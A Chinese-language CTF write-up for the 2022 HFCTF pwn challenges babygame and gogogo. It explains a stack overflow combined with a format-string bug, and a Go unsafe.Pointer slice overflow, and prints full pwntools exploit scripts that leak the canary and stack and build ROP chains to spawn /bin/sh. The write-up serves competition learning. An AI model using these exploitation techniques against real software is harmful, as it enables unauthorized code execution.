# 2022HFCTF 部分 WP

2022虎符CTF于2月19日开赛，pwn题整体难，我选了一道最简单的babygame来做，但是在比赛结束前没有调通，总结一下经验教训。

## PWN -> BabyGame (栈溢出、fmt)

### 前言

### 题目分析

checksec保护全开：

```bash
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

看下程序逻辑：

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf[256]; // [rsp+0h] [rbp-120h] BYREF
  unsigned int v5; // [rsp+100h] [rbp-20h]
  int v6; // [rsp+104h] [rbp-1Ch]
  unsigned __int64 v7; // [rsp+108h] [rbp-18h]

  v7 = __readfsqword(0x28u);
  ((&loc_1268 + 1))();
  v5 = time(0LL);
  puts("Welcome to HFCTF!");
  puts("Please input your name:");
  read(0, buf, 0x256uLL);            //栈溢出
  printf("Hello, %s\n", buf);
  srand(v5);
  v6 = sub_1305();
  if ( v6 > 0 )
    sub_13F7();
  return 0LL;
}

__int64 sub_1305()
{
  int i; // [rsp+4h] [rbp-Ch]
  int v2; // [rsp+8h] [rbp-8h]
  int v3; // [rsp+Ch] [rbp-4h]

  puts("Let's start to play a game!");
  puts("0. rock");
  puts("1. scissor");
  puts("2. paper");
  for ( i = 0; i <= 99; ++i )
  {
    printf("round %d: \n", (i + 1));
    v2 = rand() % 3;
    v3 = getint();
    if ( v2 )
    {
      if ( v2 == 1 )
      {
        if ( v3 != 2 )                          // v2=1 v3=2
          return 0LL;
      }
      else if ( v2 == 2 && v3 )             //v2=2 v3=0
      {
        return 0LL;
      }
    }
    else if ( v3 != 1 )                  //v2=0 v3=1
    {
      return 0LL;
    }
  }
  return 1LL;
}

unsigned __int64 sub_13F7()
{
  char buf[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v2; // [rsp+108h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Good luck to you.");
  read(0, buf, 0x100uLL);
  printf(buf);                                  // 格式化字符串
  return __readfsqword(0x28u) ^ v2;
}
```

主程序明显栈溢出，sub_13F7函数格式化字符串，但是只有一次使用机会。

### 利用思路

首先进入格式化字符串的条件是需要过掉sub_1305函数的条件:

```bash
v2=1 v3=2
v2=2 v3=0
v2=0 v3=1
```

但是rand是随机的，无法判断具体数值，此时可以利用主函数的栈溢出漏洞将rand的种子字段覆盖成定值（如0x61616161），之后生成的随机数是固定的。如此可以利用格式化字符串来进行栈内存的泄露和写入，现在只有一个问题，如何多次利用格式化字符串漏洞，通过修改返回地址使得函数返回的时候返回到漏洞函数，这里就想如何修改返回地址呢？只有一次格式化的机会，这里先说下格式化字符串写入可以有两种方式：

1. 写入大小受限，不能自己写入栈地址构造指针链的 或者 是不能获得栈地址的，需要用程序本身的链子来进行写入（此类通常是具有多次fmt的机会），常用的链子有指向程序名字的三级指针或ebp指针链。
2. 我们有足够的长度写入并且知道栈地址的情况，可以字节构造栈地址指针，使其指向我们需要修改的地址的栈指针，进而进行格式化字符串写入。

所以本题目的利用方式如下：

1. 通过栈溢出，覆盖srand函数的种子v5为固定值，同时泄露canary，stack地址
2. 接着bypass格式化字符串的条件（100次循环）
3. 利用格式化字符串修改fmt函数的返回地址为调用漏洞函数的地址，使得可以多次利用漏洞
4. 再次返回fmt函数，进行返回地址的修改和libc、mainaddr的泄露。
5. 最后利用fmt将fmt函数的返回地址改为栈溢出之前的地址（注意栈内存对齐）
6. 利用栈溢出覆盖main返回地址为rop，获得shell。

### 总结

这个题目当时卡在如何修改返回地址上，忽略了除了利用程序本身的链子外，可以使用fmt前的写入将自己布置的栈指针的链子指向任意地址，导致没有做出来，最后还是靠了ha1vk师傅指点，本地通了。

### exp

```python
# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

context(arch='amd64')
#io = remote('', )
# libc = ELF('./libc-2.31.so')
io = process('babygame',env = {'LD_PRELOAD':'./libc-2.31.so'})
#io = remote('120.25.205.249',39260)
libc = ELF('./libc-2.31.so')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda a=False  : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x   : io.recvn(x)
sn = lambda x   : io.send(x)
sl = lambda x   : io.sendline(x)
sa = lambda a,b   : io.sendafter(a,b)
sla = lambda a,b  : io.sendlineafter(a,b)
irt = lambda   : io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s   : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data  : u32(data.ljust(4, '\x00'))
uu64 = lambda data  : u64(data.ljust(8, '\x00'))
ur64 = lambda data  : u64(data.rjust(8, '\x00'))
def add(idx,size):
 sl('1')
 sla('Index?\n',str(idx))
 sla('Size?\n',str(size))
def show(idx):
 sl('2')
 sla('Index?\n',str(idx))
 
def edit(idx,content):
 sl('3')
 sla('Index?\n',str(idx))
 sa('content:\n',content)
  
def delete(idx):
 sl('4')
 sla('Index?\n',str(idx))

# dbg()
sa('your name:\n','a'*0x108+'a')
ru('a'*0x109)
canary = u64(rn(7).rjust(8,'\x00'))
stack = u64(rn(6).ljust(8,'\x00'))

# data = io.recvuntil("\x7f")[-13:].ljust(13,"\x00")
# canary = data[:14]
# libcbase = data[14:26]
# print libcbase
lg('stack')
lg('canary')
rand = [1,2,0,2,2,1,2,2,1,1,2,0,2,1,1,1,1,2,2,1,2,0,1,2,0,1,1,1,0,2,2,1,0,0,2,2,1,2,2,0,1,2,0,0,0,2,0,0,1,0,1,0,0,0,1,1,1,0,0,2,0,0,1,1,0,1,0,2,1,0,2,2,0,2,0,0,2,1,1,0,1,1,2,2,1,0,1,0,0,2,0,1,0,2,2,0,1,0,0,2]
input_m = []
for i in range(100):
 if rand[i] == 1:
  sla('round %s: \n'%str(i+1),'2')
 elif rand[i] == 2:
  sla('round %s: \n'%str(i+1),'0')
 elif rand[i] == 0:
  sla('round %s: \n'%str(i+1),'1')

pay = '%57c%8$hhn%9$p\n'.ljust(0x10,'a') + p64(stack - 0x218)

#raw_input()
#context.log_level = 'debug'
# dbg()
sn(pay)
# dbg()
ru('0x')
libc_base = int(rn(12),16) - 0x61d6f
pop_rdi = libc_base + libc.search(asm('pop rdi\nret')).next()
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + libc.search('/bin/sh\x00').next()
ret = libc_base + 0x0000000000022679
lg('libc_base')
lg('pop_rdi')
lg('system_addr')
lg('binsh_addr')

pay = '%57c%8$hhn%23$p'.ljust(0x10,'a') + p64(stack - 0x218)
sn(pay)
ru('0x')
main_addr = int(rn(12),16) + 0x2e9 + 0x5 +0x20
lg('main_addr')

raw_input()
pay = '%' + str(main_addr & 0xffff) + 'c%10$hn'.ljust(0x1a,'a') + p64(stack - 0x218)
sn(pay)

pay = 'a'*0x108 + p64(canary) + p64(0)*3 + p64(pop_rdi) + p64(binsh_addr) +p64(ret)+ p64(system_addr)
# raw_input()
# dbg()
sa('your name:\n',pay)
sla('round %s: \n'%str(1),'2')
sla('round %s: \n'%str(2),'1')


irt()

```

### 出题思路

1. 栈溢出覆盖栈变量+格式化字符串1次利用。

## PWN -> gogogo (go栈溢出)

这是一道go的pwn题，之前没接触过，赛后一查发现早在19年就有大佬就golang这门安全性较高的语言进行分析，主要分析了golang的安全机制和打破golang安全性的usafe.Pointer的利用方式和poc，主要涉及了golang的函数调用方式和unsafe.Pointer任意类型转换的特性，主要是切片相关的数据结构，加上unsafe.Pionter的特性导致golang的栈溢出，可以实现栈内存泄露和栈内存覆盖。
目前只涉及到gopwn的栈溢出相关的利用。

go主要由于代码对数据的范围控制比较多，反编译后会有非常多的系统生成的条件判断语句，panic非常多，导致分析起来很不方便，利用也不容易，通常会结合unsafe包来制造栈溢出的情况，下面来看看这道题目。

### 题目分析

题目是go编译的二进制文件，只开了NX，并且go是静态编译的，默认不支持PIE和canary所以对调试和利用会方便些。打开程序，可以看到main_main函数，会让你输入一个数字，不同数字对应不同的功能，main函数只有一个read功能且没有溢出，但是通过引用发现，真正的函数入口似乎不再main_main里面，而是在math.init函数：
```c
  fmt_Fprintf();
  fmt_Fprintf();                                // are you sure?
  fmt_Fprintf();
  fmt_Fprintf();
  fmt_Fprintf();
  v116 = &unk_49D7C0;
  v117 = &unk_4CFC00;
  v83 = fmt_Fprintln();
  v94 = 0LL;
  runtime_makeslice(v64);
  bufio___ptr_Reader__Read(v70, v74, v83);      // unsafe.Pinter -> stack overflow
  if ( (_BYTE)v94 == 'y' || (_BYTE)v94 == 'Y' )
  {
```
这里只截取漏洞部分，有懂原理就是将slice和unsafe包一起使用，将slice结构体的data指针覆盖成大小比slice的cap小的局部变量指针导致在read的时候出现栈溢出的情况。
这里有个poc，可以解释其原理：
```golang
// initialize the reader outside of the main function to simplify POC development, as 
// there are less local variables on the stack.
var reader = bufio.NewReader(os.Stdin)

func main() {
    // this is a harmless buffer, containing some harmless data
    harmlessData := [8]byte{'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A'}

    // create a slice of length 512 byte, but assign the address of the harmless data as
    // its buffer. Use the reflect.SliceHeader to change the slice
    confusedSlice := make([]byte, 512)
    sliceHeader := (*reflect.SliceHeader)(unsafe.Pointer(&confusedSlice))
    harmlessDataAddress := uintptr(unsafe.Pointer(&(harmlessData[0])))
    sliceHeader.Data = harmlessDataAddress

    // now read into the confused slice from STDIN. This is not quite as bad as a gets()
    // call in C, but almost. The function will read up to 512 byte, but the underlying
    // buffer is only 8 bytes. This function is pretty much the complete vulnerability
    _, _ = reader.Read(confusedSlice)
}
```
将slice结构的data指针（512byte）变为局部变量harmlessData（8byte），导致后面`reader.Read(confusedSlice)`的时候出现栈溢出。

### 功能分析

题目让输入特定的数字进入不同功能，但是漏洞点只有在完成程序给的参数字游戏才能到达，所以要先过猜数字游戏，游戏玩法参考[这里](https://www.cnblogs.com/funlove/p/13215041.html),解法就是穷举结果，必然有一个是对的，但是不能一个一个试，程序只有7次机会（爆破也可以，因为可以try again），这里只能随机输入一个数字，从answers里面排除，这样大概在5到6次就可以得出结果。之后会来到功能选择界面，这里直接选择退出，因为和漏洞点没有关系，之后来到漏洞点，输入payload进行rop即可。

### 利用步骤
go程序有以下syscall链子，浑然天成：
```c
.text:000000000047CF00 ; __int64 __usercall syscall_Syscall@<rax>()
.text:000000000047CF00 syscall_Syscall proc near               ; CODE XREF: syscall_Close+2B↑p
.text:000000000047CF00                                         ; syscall_fcntl+2F↑p ...
.text:000000000047CF00
.text:000000000047CF00 arg_0           = qword ptr  8
.text:000000000047CF00 arg_8           = qword ptr  10h
.text:000000000047CF00 arg_10          = qword ptr  18h
.text:000000000047CF00 arg_18          = qword ptr  20h
.text:000000000047CF00 arg_20          = qword ptr  28h
.text:000000000047CF00 arg_28          = qword ptr  30h
.text:000000000047CF00 arg_30          = qword ptr  38h
.text:000000000047CF00
.text:000000000047CF00                 call    sub_45D5C0
.text:000000000047CF05                 mov     rdi, [rsp+arg_8]         <---'/bin/sh\x00'-->
.text:000000000047CF0A                 mov     rsi, [rsp+arg_10]        <---0--->
.text:000000000047CF0F                 mov     rdx, [rsp+arg_18]        <---0--->
.text:000000000047CF14                 mov     rax, [rsp+arg_0]         <---59--->
.text:000000000047CF19                 syscall                 ; LINUX -    <---execve('/bin/sh',0,0)--->
.text:000000000047CF1B                 cmp     rax, 0FFFFFFFFFFFFF001h
```
1. 玩游戏win
2. 由于静态编译，程序里有天然的ropchain，找到syacall的rop链子，确定覆盖长度
3. 由于syscall是靠栈来传参数的，所以rop还是比较容易的,避免去找控制rdi、rsi、rdx的链子了（rdi/rsi链子不好找）
4. 输入payload，覆盖返回地址，获得shell。

### exp
slice的结构体指针有随机性，可多次尝试运行。
```python
# coding=utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

p=process("./gogogo")

def guessTrainner():
   start =time.time()
   answerSet=answerSetInit(set())
#    print answerSet
   for i in range(6):
      inputStrMax=suggestedNum(answerSet,100)
      print('第%d步----' %(i+1))
      print('尝试：' +inputStrMax)
      print('----')
      AMax,BMax = compareAnswer(inputStrMax)
      print('反馈：%dA%dB' % (AMax, BMax))
      print('----')
      print('排除可能答案：%d个' % (answerSetDelNum(answerSet,inputStrMax,AMax,BMax)))
      answerSetUpd(answerSet,inputStrMax,AMax,BMax)
      if AMax==4:
         elapsed = (time.time() - start)
         print("猜数字成功，总用时：%f秒，总步数：%d。" %(elapsed,i+1))
         break
      elif i==5:
         print("猜数字失败！")
 
 
def compareAnswer(inputStr):
    inputStr1 = inputStr[0]+' '+inputStr[1]+' '+inputStr[2]+' '+inputStr[3]
    p.sendline(inputStr1)
    ru('\n')
    tmp = p.recvuntil('B',timeout=0.5)
    # print(tmp)
    if tmp == '':
        return 4,4
    tmp = tmp.split("A")
    A = tmp[0]
    B = tmp[1].split('B')[0]
    return int(A),int(B)
 
def compareAnswer1(inputStr,answerStr):
   A=0
   B=0
   for j in range(4):
      if inputStr[j]==answerStr[j]:
         A+=1
      else:
         for k in range(4):
            if inputStr[j]==answerStr[k]:
               B+=1
   return A,B
   
def answerSetInit(answerSet):
	answerSet.clear()
	for i in range(1234,9877):
		seti=set(str(i))
		print seti
		if len(seti)==4 and seti.isdisjoint(set('0')):
			answerSet.add(str(i))
	return answerSet
 
def answerSetUpd(answerSet,inputStr,A,B):
   answerSetCopy=answerSet.copy()
   for answerStr in answerSetCopy:
      A1,B1=compareAnswer1(inputStr,answerStr)
      if A!=A1 or B!=B1:
         answerSet.remove(answerStr)
 
def answerSetDelNum(answerSet,inputStr,A,B):
   i=0
   for answerStr in answerSet:
      A1, B1 = compareAnswer1(inputStr, answerStr)
      if A!=A1 or B!=B1:
         i+=1
   return i
 
 
def suggestedNum(answerSet,lvl):
   suggestedNum=''
   delCountMax=0
   if len(answerSet) > lvl:
      suggestedNum = list(answerSet)[0]
   else:
      for inputStr in answerSet:
         delCount = 0
         for answerStr in answerSet:
            A,B = compareAnswer1(inputStr, answerStr)
            delCount += answerSetDelNum(answerSet, inputStr,A,B)
         if delCount > delCountMax:
            delCountMax = delCount
            suggestedNum = inputStr
         if delCount == delCountMax:
            if suggestedNum == '' or int(suggestedNum) > int(inputStr):
               suggestedNum = inputStr
 
   return suggestedNum
 
 
ru("PLEASE INPUT A NUMBER:")
p.sendline("1717986918")
ru("PLEASE INPUT A NUMBER:")
p.sendline("1234") 
# gdb.attach(p)
# p.sendline("305419896")
# p.interactive()
# p.interactive()
ru("YOU HAVE SEVEN CHANCES TO GUESS")
guessTrainner()
sa("AGAIN OR EXIT?","exit")
gdb.attach(p)
sla("(4) EXIT","4")
syscall = 0x47CF05
# syscall = 0x000000000042c066
binsh = 0xc0000be000

payload = '/bin/sh\x00'*0x8c + p64(syscall) + p64(0) + p64(59) + p64(binsh) + p64(0) + p64(0)
 
sla("ARE YOU SURE?",payload)
p.interactive()
 

```
### 总结

第一次接触golang的pwn，由于复杂的panic利用方式目前就是栈溢出，关于栈的部分和x86_64的栈大同小异，如果能克服反编译代码带来的不适，找到漏洞点，那么利用起来还是比较简单的。

### refer

1. [2019挖宝pwn](https://bbs.pediy.com/thread-250295.htm)
2. [Usafe Pointer](https://dev.to/jlauinger/exploitation-exercise-with-unsafe-pointer-in-go-information-leak-part-1-1kga)
3. [Usafe Pointer POC](https://github.com/jlauinger/go-unsafepointer-poc)
4. [2022HFCTF PWN WP](https://www.jianshu.com/p/8f788aa5a28e)

### 出题思路

1. golangpwn 栈溢出
2. 可以用golang的汇编出逆向题目

## PWN -> vdq

大夫盘。
